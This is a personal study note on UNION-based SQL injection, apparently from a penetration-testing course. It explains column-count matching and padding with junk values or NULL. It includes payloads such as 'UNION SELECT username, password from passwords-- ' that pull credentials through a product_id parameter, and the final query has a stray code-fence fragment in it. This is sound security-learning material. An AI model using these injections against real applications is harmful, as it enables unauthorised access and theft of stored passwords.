
***
###### `Title :- Union Clause`
###### `Created on :- 2023-06-16 - 22:57`
###### `Created by:- Prem J`
***

- We have used some techniques like [[Subverting Query Logic]], [[Using Comments]] to perform SQLi, we can also perform SQLi by injecting SQL queries along with the original SQL query using the Union Clause

#### `Union -->`

- [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used combine multiple `SELECT` statements.

```shell-session
SELECT * FROM ports;
SELECT * FROM ships;
```

- the above two select statements can be combined as 

```shell-session
SELECT * FROM ports UNION SELECT * FROM ships;
```

>[!Note]
>While performing union we need to be careful at the datatypes as The data types of the selected columns on all positions should be the same. In the above example both ports and ships are of same data type strings.

#### `Even Columns -->`

- A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

- the error is because the first query returns one column and second results in two columns.
- Once we have two queries that return the same number of columns, we can use the `UNION` operator to extract data from other tables and databases.

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

- Above is a query based on user input we can leverage this to extract username and password. We will use a `UNION` statement to extract it.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

- The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns

#### `Uneven Columns -->`

- We will find out that original query will usually not have the same number of columns as the SQL query we want to execute.
- In that case, we want to `SELECT`, we can put **junk data** for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.

>[!Note]
>When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

>[!tip]
>For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

- Upon adding the junk the final query will be like

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

- If there are more columns in the products table then

```sql
SELECT * from products where product_id = '1' ```sql UNION SELECT username, 2, 3, 4 from passwords-- '
```

